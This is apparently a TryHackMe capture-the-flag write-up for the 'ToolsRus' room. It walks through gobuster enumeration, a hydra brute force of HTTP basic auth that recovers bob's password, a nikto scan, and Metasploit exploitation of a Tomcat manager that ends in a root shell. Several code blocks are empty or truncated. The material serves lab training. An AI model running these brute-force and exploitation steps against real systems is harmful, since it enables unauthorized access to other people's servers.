## Solution

### Check for services with nmap

We start by scanning the machine with `nmap`

```bash

### Search for directories and files with gobuster

Next, let's search for directories and files (html, php, and txt) with `gobuster`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html,php,txt -u http://10.10.236.92

```

And there we have the directory that begins with `g`.

Now we check the contents of the directory with `curl`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ curl http://10.10.236.92/guidelines/                                                          
Hey <b>bob</b>, did you update that TomCat server?
```

And there we have the name of the user.

### Bruteforce the password with hydra

We see from the `gobuster` result that the `protected` directory requires authentication due to it's 401 [HTTP status code](https://en.wikipedia.org/wiki/List_of_HTTP_status_codes).

Why not try to bruteforce bob's password with `hydra`?  
We will use the [rockyou.txt wordlist](https://github.com/zacheller/rockyou)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.236.92 http-get /protected
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-16 11:51:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.236.92:80/protected
[80][http-get] host: 10.10.236.92   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-16 11:51:35
```

So bob's password is `bubbles`.

Now we can check the contents of the `protected` directory with `curl`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ curl -u bob:bubbles http://10.10.236.92/protected/  
<center></br>
<img width=150 src="protected.png">
<p>This protected page has now moved to a different port.</p>
</center>
```

### Scan the Tomcat service with Nikto

Let's move on and turn our attention to the Tomcat service running on port `1234`.  
Manually browsing to `http://10.10.236.92:1234/` gives us the version of Apache Tomcat.  
The version of Coyote was already found in the `nmap` version scan.

Next, we scan the Manager App (the `/manager/html` directory) with `nikto`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
└─$ nikto -url http://10.10.236.92:1234/manager/html -id bob:bubbles
- Nikto v2.5.0

### Exploit the Tomcat service

Of course we want to exploit the Tomcat service and for this we use [Metasploit](https://www.metasploit.com/)

Hhmm, for unknown reasons the exploit failed.

Let's switch target and payload and try again

```text

Ah, that's better!

Now we can get a shell

```text
meterpreter > sysinfo
Computer     : ip-10-10-148-39.eu-west-1.compute.internal
OS           : Ubuntu 16.04 (Linux 4.4.0-1075-aws)

Meterpreter  : x86/linux
meterpreter > shell

```

We are running as root.

### Get the flag

Finally, we locate and cat the flag

```bash
cd /root
ls -la
total 40
